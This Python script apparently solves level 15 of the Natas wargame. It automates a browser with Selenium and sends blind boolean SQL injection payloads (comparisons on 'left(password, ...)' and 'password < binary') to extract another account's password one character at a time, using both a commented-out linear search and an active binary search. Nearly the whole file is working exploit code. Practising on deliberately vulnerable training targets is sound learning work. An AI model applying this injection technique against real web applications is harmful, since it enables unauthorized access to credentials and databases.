from common import *
import string

def solve(driver, _ = None):

    #--------------------------------------------------LINEAR SEARCH--------------------------------------------------
    # language = string.ascii_lowercase+string.digits
    # password = ""
    
    # while True:                                                 # because we don't know the length of the password
    #     for symbol in language:
    #         driver.get(build_url(level=15))
            
    #         driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(
    #             # sql injection, we're brute forcing the password but only one letter at a time so only O(n*m), also only checking lowercase
    #             f'natas16" and left(password, {len(password)+1})="{password+symbol}" #' 
    #         )
    #         driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
            
    #         WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]'))
    #         text = driver.find_element(By.XPATH, '//*[@id="content"]').text
    #         if "This user exists." in text:
    #             password += symbol
    #             print("password: ", password, end = '\r')
    #             break
    #     else:
    #         print()
    #     break                                                   # no letter fit, meaning we're at the end of the password
    
    # for i, letter in enumerate(password):                       # check if the password is uppercase
    #     if letter.isalpha():
    #         # try in upper case with case sensitive collation
    #         driver.get(build_url(level=15))
            
    #         driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(
    #             # sql injection, we're brute forcing the password but only one letter at a time so only O(n^2), also only checking lowercase
    #             f'natas16" and left(password, {i+1}) like binary "{password[:i] + password[i].upper()}" #' 
    #         )
    #         driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
            
    #         WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]'))
    #         text = driver.find_element(By.XPATH, '//*[@id="content"]').text
    #         if "This user exists." in text:
    #             password = password[:i] + password[i].upper() + password[i+1:]
    #             print("password: ", password, end = '\r')
    # print()
    
    
    #--------------------------------------------------BINARY SEARCH--------------------------------------------------
    language = string.digits+string.ascii_uppercase+string.ascii_lowercase                      # in order of utf/ascii values.
    password = ""
    driver.get(build_url(level=15))
    
    # for first back to work
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys("bla")
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
    
    while True:                                                                                 # because we don't know the length of the password (it's 34, but maybe it's not in the future)
        # binary search
        low = 0
        high = len(language)-1
        while low <= high:
            mid = (low+high)//2
            driver.back()
            text_field = driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]')
            text_field.clear()
            text_field.send_keys(
                f'natas16" and password < binary "{password+language[mid]}" #'
            )
            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
            WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]'))
            text = driver.find_element(By.XPATH, '//*[@id="content"]').text
            
            if "This user exists." in text:
                high = mid - 1
            else:
                # check if equal
                driver.back()
                text_field = driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]')
                text_field.clear()
                text_field.send_keys(
                    f'natas16" and left(password, {len(password)+1})= binary "{password+language[mid]}" #'
                )
                driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
                WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]'))
                text = driver.find_element(By.XPATH, '//*[@id="content"]').text

                if "This user exists." in text:
                    password += language[mid]
                    break
                else:
                    low = mid + 1
        else:                                                                                    # if the while loop ended without breaking, we know that we've reached the end of the password 
            break
        
        print(password, end = '\r')

    print()
    
    
    driver.get(build_url(password = password, level=16))
    return password